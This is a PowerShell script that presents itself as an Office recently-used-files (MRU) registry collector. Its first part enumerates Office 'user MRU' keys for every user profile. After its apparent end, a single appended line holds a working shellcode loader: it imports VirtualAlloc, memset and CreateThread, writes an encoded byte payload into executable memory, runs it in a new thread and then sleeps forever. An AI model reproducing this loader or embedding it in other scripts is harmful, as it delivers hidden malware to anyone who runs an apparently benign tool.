


$Error.Clear()
$ErrorActionPreference = "SilentlyContinue"


$office_versions = @("15.0", 
				"14.0", 
				"11.0", 
				"10.0", 
				"9.0" 
				)


$user_SIDs = gwmi win32_userprofile | select sid


Foreach ($user_SID in $user_SIDs.sid){

	
	Foreach ($version in $office_versions){

		
		$key_base = "\HKEY_USERS\" + $user_SID + "\software\microsoft\office\" + $version +"\" 

		
		If (test-path -Path registry::$key_base) {

			
			$office_key_ring = Get-ChildItem -Path Registry::$key_base 

			
			ForEach ($office_key in $office_key_ring){
				$office_app_key = $office_key.name + "\user mru"

				
				if (test-path -Path Registry::$office_app_key) {

					
					Get-ChildItem -Path Registry::$office_app_key -Recurse; 
				}
			}
		}
	}
}

if ($Error) {
	
    Write-Error "Get-OfficeMRU Error on $env:COMPUTERNAME"
    Write-Error $Error
	$Error.Clear()
}
Write-Debug "Exiting $($MyInvocation.MyCommand)" 
$VG6 = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $VG6 -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xda,0xd1,0xbf,0x40,0x46,0x24,0x58,0xd9,0x74,0x24,0xf4,0x5b,0x31,0xc9,0xb1,0x47,0x31,0x7b,0x18,0x03,0x7b,0x18,0x83,0xeb,0xbc,0xa4,0xd1,0xa4,0xd4,0xab,0x1a,0x55,0x24,0xcc,0x93,0xb0,0x15,0xcc,0xc0,0xb1,0x05,0xfc,0x83,0x94,0xa9,0x77,0xc1,0x0c,0x3a,0xf5,0xce,0x23,0x8b,0xb0,0x28,0x0d,0x0c,0xe8,0x09,0x0c,0x8e,0xf3,0x5d,0xee,0xaf,0x3b,0x90,0xef,0xe8,0x26,0x59,0xbd,0xa1,0x2d,0xcc,0x52,0xc6,0x78,0xcd,0xd9,0x94,0x6d,0x55,0x3d,0x6c,0x8f,0x74,0x90,0xe7,0xd6,0x56,0x12,0x24,0x63,0xdf,0x0c,0x29,0x4e,0xa9,0xa7,0x99,0x24,0x28,0x6e,0xd0,0xc5,0x87,0x4f,0xdd,0x37,0xd9,0x88,0xd9,0xa7,0xac,0xe0,0x1a,0x55,0xb7,0x36,0x61,0x81,0x32,0xad,0xc1,0x42,0xe4,0x09,0xf0,0x87,0x73,0xd9,0xfe,0x6c,0xf7,0x85,0xe2,0x73,0xd4,0xbd,0x1e,0xff,0xdb,0x11,0x97,0xbb,0xff,0xb5,0xfc,0x18,0x61,0xef,0x58,0xce,0x9e,0xef,0x03,0xaf,0x3a,0x7b,0xa9,0xa4,0x36,0x26,0xa5,0x09,0x7b,0xd9,0x35,0x06,0x0c,0xaa,0x07,0x89,0xa6,0x24,0x2b,0x42,0x61,0xb2,0x4c,0x79,0xd5,0x2c,0xb3,0x82,0x26,0x64,0x77,0xd6,0x76,0x1e,0x5e,0x57,0x1d,0xde,0x5f,0x82,0x88,0xdb,0xf7,0x0a,0x6c,0xef,0x0f,0x3d,0x6c,0xef,0x0e,0x01,0xf9,0x09,0x40,0x29,0xaa,0x85,0x20,0x99,0x0a,0x76,0xc8,0xf3,0x84,0xa9,0xe8,0xfb,0x4e,0xc2,0x82,0x13,0x27,0xba,0x3a,0x8d,0x62,0x30,0xdb,0x52,0xb9,0x3c,0xdb,0xd9,0x4e,0xc0,0x95,0x29,0x3a,0xd2,0x41,0xda,0x71,0x88,0xc7,0xe5,0xaf,0xa7,0xe7,0x73,0x54,0x6e,0xb0,0xeb,0x56,0x57,0xf6,0xb3,0xa9,0xb2,0x8d,0x7a,0x3c,0x7d,0xf9,0x82,0xd0,0x7d,0xf9,0xd4,0xba,0x7d,0x91,0x80,0x9e,0x2d,0x84,0xce,0x0a,0x42,0x15,0x5b,0xb5,0x33,0xca,0xcc,0xdd,0xb9,0x35,0x3a,0x42,0x41,0x10,0xba,0xbe,0x94,0x5c,0xc8,0xae,0x24;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$Lnk=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($Lnk.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$Lnk,0,0,0);for (;;){Start-sleep 60};

